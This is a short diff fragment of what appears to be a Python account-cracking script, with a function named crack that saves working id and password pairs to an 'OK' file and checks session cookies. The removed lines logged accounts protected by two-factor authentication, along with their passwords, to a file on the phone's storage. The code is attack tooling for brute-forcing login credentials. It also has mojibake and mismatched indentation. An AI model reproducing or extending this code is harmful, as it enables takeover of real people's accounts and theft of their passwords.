@@ -505,10 +505,6 @@ def crack(idf,pwv):
 				open('OK/'+okc,'a').write(idf+' â€¢ '+pw+'\n')
 				cek_apk(session,coki)
 				break
-	   	elif twf in str(lo):
-                #print('\r\r\033[1;34m[SHANTO-2F🔒]  ' +uid+ ' • ' +ps+ ' \033[0;97m')
-                open('/sdcard/FILE-2F.txt', 'a').write( uid+' | '+ps+' \n')
-                break
 			else:
 				continue
 		except requests.exceptions.ConnectionError:
